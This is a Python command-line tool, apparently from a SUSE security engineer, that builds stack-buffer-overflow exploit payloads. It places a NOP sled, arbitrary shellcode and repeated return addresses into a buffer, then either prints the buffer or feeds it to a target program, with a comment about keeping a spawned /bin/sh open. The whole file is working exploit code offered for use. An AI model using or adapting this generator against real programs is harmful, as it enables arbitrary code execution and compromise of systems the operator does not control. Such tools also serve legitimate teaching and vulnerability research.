#!/usr/bin/python3

import argparse
import os
import subprocess
import sys
import tempfile

# Matthias Gerstner
# SUSE Linux GmbH
# matthias.gerstner@suse.com


def hex_int(val):
    return int(val, 16)


def getSignalName(sig):
    import signal
    return signal.Signals(sig).name


def eprint(*args, **kwargs):
    kwargs['file'] = sys.stderr
    print(*args, **kwargs)


parser = argparse.ArgumentParser(
    description="Creates exploit data for a stack overflow to execute an arbitrary code snippet."
)

parser.add_argument(
    "-p", "--program", help="The program to exploit. This needs to accept a file input parameter that will lead to an overflow.",
    required=False
)

parser.add_argument(
    "-a", "--address", help="Return address to use for the exploit.",
    type=hex_int,
    required=True
)

parser.add_argument(
    "-c", "--code", help="Path to a file containing the isolated, binary code snippet to embed into the exploit for execution.",
    type=str,
    required=True
)

parser.add_argument(
    "-s", "--size", help="Size of the buffer you're overflowing.",
    type=int,
    required=True
)

parser.add_argument(
    "-e", "--exploit-size", help="Size of the complete exploit buffer. Needs to be somewhat larger than the buffer --size we're overflowing.",
    type=int,
    default=0
)

parser.add_argument(
    "--padding-offset", help="custom offset for padding of code and return address",
    type=int,
    default=0
)

parser.add_argument(
    "-o", "--output", help="Just output the exploit data instead of feeding it to the exploitable program.",
    default=False,
    action='store_true'
)

args = parser.parse_args()

prog = args.program

if prog and not os.path.isabs(prog):
    prog = os.path.join(os.getcwd(), prog)

if not args.output and (not prog or not os.path.exists(prog)):
    eprint("Specify either -o or a valid -p")
    if prog:
        eprint("Couldn't find program to exploit in", prog)
    sys.exit(1)

try:
    with open(args.code, 'rb') as code_fd:
        code = code_fd.read()

except IOError as e:
    eprint("Failed to open code input file:", e)
    sys.exit(1)

MIN_EXTRA_SPACE = 64
DEFAULT_OF_SIZE = 128

if args.size < len(code):
    eprint("Target stack buffer is too small to fit the exploit code")
    eprint("Need at least", len(code), "bytes")
    sys.exit(1)
elif args.exploit_size and args.exploit_size < args.size + 8:
    eprint("Requested exploit size is too small to overwrite the stack return address")
    eprint("Need at least", args.size + 8, "or better", args.size + 64)
    sys.exit(1)
elif not args.exploit_size:
    args.exploit_size = args.size + DEFAULT_OF_SIZE

# time to create the exploit buffer

NOP_INSTRUCTION = int(0x90).to_bytes(1, byteorder='little', signed=False)

# start the buffer with as much NOPs as we can afford
nop_amount = args.size - len(code)
# make sure the code starts on a word boundary to avoid alignment issues in
# the code that follows
nop_amount = nop_amount - (nop_amount % 8)
nop_amount += args.padding_offset
exploit = NOP_INSTRUCTION * nop_amount

# add the exploit code
exploit += code

# number of return addresses we're adding to the end of the buffer, this is
# what will actually overflow onto the stack mgm area in hope we're reaching
# the return address
ret_addr_count = int((args.exploit_size - len(exploit)) / 8)
# make sure the return address starts at an 8-byte alignment
padding_count = 8 - (len(exploit) % 8)
padding_count = padding_count if padding_count != 8 else 0
padding_count += args.padding_offset
exploit += NOP_INSTRUCTION * padding_count
ret_addr_bin = args.address.to_bytes(8, byteorder='little', signed=False)

exploit += (ret_addr_count * ret_addr_bin)

if args.output:

    if os.isatty(sys.stdout.fileno()):

        for bt in exploit:
            print("\\x" + format(bt, '02x'), end='')

        print()
    else:
        # write binary data if this is a file output
        os.write(sys.stdout.fileno(), exploit)

    sys.exit(0)

exploit_file = tempfile.NamedTemporaryFile()
exploit_file.write(exploit)
exploit_file.flush()

# pass the exploit by file instead of via stdin, because if the exploit
# triggers (i.e. calling /bin/sh) then the shell would be immediately closed
# if stdin returns EOF.
process = subprocess.Popen([prog, exploit_file.name])

res = process.wait()
if res >= 0:
    print("Program exited with", res)
else:
    print("Program terminated with signal", getSignalName(abs(res)))
